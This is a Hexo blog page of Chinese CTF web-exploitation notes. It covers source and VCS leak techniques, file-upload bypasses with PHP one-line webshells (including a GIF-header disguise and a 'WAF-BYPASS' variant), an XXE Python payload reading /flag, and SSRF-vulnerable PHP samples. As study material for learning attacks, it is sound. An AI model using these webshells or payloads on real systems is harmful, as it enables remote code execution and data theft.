<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>web | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="一信息泄露1.目录遍历&#x2F;1跳过其他目录找到flag#&#x2F;..&#x2F;2.phpinfoPhp探针通过网页查找flag搜索3.备份文件下载（1：网站源码常见网站源码备份tar&#x2F;tar.gz&#x2F;zip&#x2F;rar文件名web&#x2F;website&#x2F;backup&#x2F;back&#x2F;www&#x2F;wwwroot&#x2F;temp">
<meta property="og:type" content="article">
<meta property="og:title" content="web">
<meta property="og:url" content="http://example.com/2025/03/15/1/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="一信息泄露1.目录遍历&#x2F;1跳过其他目录找到flag#&#x2F;..&#x2F;2.phpinfoPhp探针通过网页查找flag搜索3.备份文件下载（1：网站源码常见网站源码备份tar&#x2F;tar.gz&#x2F;zip&#x2F;rar文件名web&#x2F;website&#x2F;backup&#x2F;back&#x2F;www&#x2F;wwwroot&#x2F;temp">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2025-03-15T12:16:55.000Z">
<meta property="article:modified_time" content="2025-03-15T12:28:09.007Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/03/15/1/" class="article-date">
  <time class="dt-published" datetime="2025-03-15T12:16:55.000Z" itemprop="datePublished">2025-03-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      web
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>一信息泄露<br>1.目录遍历&#x2F;1<br>跳过其他目录找到flag#&#x2F;..&#x2F;<br>2.phpinfo<br>Php探针<br>通过网页查找flag搜索<br>3.备份文件下载<br>（1：网站源码<br>常见网站源码备份<br>tar&#x2F;tar.gz&#x2F;zip&#x2F;rar<br>文件名<br>web&#x2F;website&#x2F;backup&#x2F;back&#x2F;www&#x2F;wwwroot&#x2F;temp<br>使用dirsearch工具无法使用    # python3  dirsearch.py  -u网址 -e*<br>（2：bak文件<br>备份在web文件<br>访问url&#x2F;index.php.bak下载源码获得flag<br>（3：vim缓存<br>使用了vim编辑器，就会留有缓存。会一直留存在服务器上<br>第一次 .index.php.swp<br>第二次 .index.php.swo<br>第三次 .index.php.swn<br>也可能生成.index.php.~<br>Index前有.<br>注入后会下载文件<br>记事本打开使用ctrl+f<br>查找flag<br>（4：DS.store<br>苹果系统Linux文件<br>url&#x2F;.DS_Store下载文件<br>工具python-dsstore<br>无法使用工具<br>4.git泄漏<br>开发者会在GitHub等云环境中，会导致git泄露<br>Git工具使用<br>Githacker工具使用 # python3  GitHacker.py 网址 &#x2F;.git<br>&#x2F;# ls 得知有什么文件 消除上一个网址的影响 # cd .. #ls  # rm -rf<br>首先要用dirsearch扫描文件（注意是git文件），再注入得到文件<br>得到flag<br>在kail中操作先下载环境<br>三种log stash index<br>Log  #git log获得版本号，版本前九位数# git reset –hard (九位数）<br>Stash #git stash pop（从git栈中获得最后一次的保存内容）Git stash list获得全部<br>Index  在githacker中 # ks #ls #more 文件<br>5.SVN泄露<br>保存在pristine文件夹<br>SVN工具  # .&#x2F;rip-svn.pl -v -u 网址 &#x2F;.svn&#x2F;<br>查找隐藏文件# ls -ah<br>找到.svn文件然后# ls #cd pristine&#x2F;文件<br>6.HG泄露（windows<br>HG工具dvcs-ripper</p>
<h1 id="rip-hg-pl-v-u-网址-hg"><a href="#rip-hg-pl-v-u-网址-hg" class="headerlink" title=".&#x2F;rip-hg.pl -v -u 网址 &#x2F;.hg&#x2F;"></a>.&#x2F;rip-hg.pl -v -u 网址 &#x2F;.hg&#x2F;</h1><p>#grep -r flag*进入flag文件就行了<br>二.文件上传<br>一句话木马</p>
<p>&#x2F;&#x2F; 构造合法 GIF 头部 + PHP 代码<br>$payload &#x3D; hex2bin(‘474946383961’) .  &#x2F;&#x2F; GIF89a<br>    “<?php system(\$_GET['cmd']); ?>“;<br>file_put_contents(‘shell.gif’, $payload);</p>
<p>getimagesize(上 函数返回一个包含图像信息的数组。该数组的索引如下所示：<br>索引·0：图像的宽度（单位：像素）<br>索引·1：图像的高度（单位：像素）《<br>索引：2：图像类型的常量值（可以使用 image type to mime_type(·函数将其转换为MIME<br>类型）<br>索引·3：包含图像属性的字符串，以逗号分隔(如·”width&#x3D;500, height&#x3D;300”)&lt;<br>如果·getimagesize()·函数无法读取图像信息，则返回·false。否则，返回一个包含上述索引<br>的数组。<br>IMAGETYPE GIF：代表·GIF·图像文件的常量值<br>IMAGETYPE JPEG：代表·JPEG·图像文件的常量值<br>IMAGETYPE PNG：代表·PNG·图像文件的常量值<br>GIF89a</p>
<script language="php">eval($_POST['a']);</script> 
<p>GIF89a<br><?php/* WAF-BYPASS*/
system($_POST['cmd']);
?><br><?php
@eval($_POST['a']);
?><br>生小马<br><?php fputs(fopen(‘shell.php’,’w’),’<?php @eval($_POST[“a”])?>’);?&gt;</p>
<p>图片标识<br>JPEG&#x2F;JFIF （常见的照片格式)：头两个字节为·0xFF·0xD8。<br>PNG（无损压缩格式）：头两个字节为·0x89·0x50。<br>GIF（支持动画的图像格式)：头两个字节为·0x47-0x49。<br>BMP(Windows 位图格式)：头两个字节为·0x42:0x4D。<br>TIFF（标签图像文件格式)：头两个字节可以是不同的数值。</p>
<p>1.js绕过<br>判断JavaScript<br>上传是否有直接显示禁止上传<br>(1:禁用js脚本<br>以 firefox 为例<br>接着再地址栏输入 about:config，点击回车键<br>在搜索地址栏中输入 javascript.enabled<br>(2:修改js脚本<br>修改可以上传php文件后获得表格查询flag<br>(3:使用bp抓包<br>修改文件后缀名<br>制作一个 phpinfo 内容的文件，后级修改为var allow_ext &#x3D;”jpgl.pngl.git”;<br>其中之一，使用burp 抓包，修改文件后缀为php</p>
<p>2.content-Type绕过<br>Content-Type，内容类型，一般是指网页中存在的ContentlType，用于定义网络文件的类型和网页的编码，决定文件接收方将以什么形式、什么编码读取这个文件，这就是经常看到一些 Asp网页点击的结果却是下载到的一个文件或一张图片的原因。<br>用 burpsuite 抓包，找到 content-type 字段，修改上传文件类型为image&#x2F;jpeg，则可以绕过检测，上传脚本文件。<br>一句话木马（记得关杀毒监管）<br><?php system($_GET['cmd']); ?></p>
<p>3.文件后缀绕过<br>可以尝试 phtml，php3，php4, php5, pht 后缀名都可以绕过，但是前提是要在配置文件<br>里面有这样的一句话<br>AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht<br>httpd.conf 中有如下配置代码<br>AddType application&#x2F;x-httpd-php. php .phtm! .phps .php5 .pht .htaccess</p>
<p>4.htaccess<br>有文件后缀过滤<br>但是htaccess没有过滤</p>
<p>XXE漏洞<br>Xml<br>Bp抓包变成json<br>通过DTD注入<br>利用python实现对网页的注入<br>import requests</p>
<p>url &#x3D; “<a target="_blank" rel="noopener" href="http://node2.anna.nssctf.cn:28937/ghctf">http://node2.anna.nssctf.cn:28937/ghctf</a>“<br>payload &#x3D; “””<?xml version="1.0"?><br><!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///flag">找到flag文件包<br>]&gt;<br><root><br>    <name>&xxe;</name><br></root>“””</p>
<p>response &#x3D; requests.post(url, data&#x3D;{“xml”: payload})<br>print(response.text)输出flag</p>
<p>Ezlogin<br>弱口令爆破<br>用户密码登录<br>1.登录用户名为admin<br>2.查看网页源代码，发现该题是弱口令爆破<br>3.使用BurpSuite爆破，得到用户密码为administrator。<br>pickle反序列化</p>
<p>POP链反序列化的题目读代码从后往前</p>
<p>Gopher 与SSRF漏洞</p>
<p>Ssrffile_get_contents()</p>
<p>&#x2F;&#x2F;file_get_contents是把文件写入字符串，当把url是内网文件的时候，会先去把这个文件的内容读出来再写入，导致了文件读取</p>
<?php
if(isset($_POST['url']))
{
    $content=file_get_contents($_POST['url']);
    $filename='./images/'.rand().'.img';\
    file_put_contents($filename,$content);
    echo $_POST['url'];
    $img="<img src=\"".$filename."\"/>";

}
echo $img;
?>
<p>fsockopen()</p>
<p>&#x2F;&#x2F;fsockopen()函数本身就是打开一个网络连接或者Unix套接字连接</p>
<?php
$host=$_GET['url'];
$fp = fsockopen("$host", 80, $errno, $errstr, 30);
if (!$fp) {
    echo "$errstr ($errno)<br />\n";
} else {
    $out = "GET / HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);
    while (!feof($fp)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}
?>
<p>curl()</p>
<p>&#x2F;&#x2F;利用方式很多最常见的是通过file、dict、gopher这三个协议来进行渗透，接下来也主要是集中讲对于curl()函数的利用方式</p>
<p>function curl($url){<br>    $ch &#x3D; curl_init(); &#x2F;&#x2F;  初始化curl连接句柄<br>    curl_setopt($ch, CURLOPT_URL, $url); &#x2F;&#x2F;设置连接URL<br>    curl_setopt($ch, CURLOPT_HEADER, 0);  &#x2F;&#x2F; 不输出头文件的信息<br>    curl_exec($ch);   &#x2F;&#x2F; 执行获取结果<br>    curl_close($ch);  &#x2F;&#x2F; 关闭curl连接句柄<br>}</p>
<p>$url &#x3D; $_GET[‘url’];<br>curl($url); </p>
<p>file:&#x2F;&#x2F;&#x2F;  – 本地文件传输协议，主要用于访问本地计算机中的文件<br>dict:&#x2F;&#x2F;   – 字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口2628<br>sftp:&#x2F;&#x2F;   – SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol）<br>ldap:&#x2F;&#x2F;   – 轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议<br>tftp:&#x2F;&#x2F;   – 基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机<br>gopher:&#x2F;&#x2F; – 互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/03/15/1/" data-id="cmcvotwbt0000yowy1r7r0my6" data-title="web" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
    
  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/03/">March 2025</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/03/15/1/">web</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>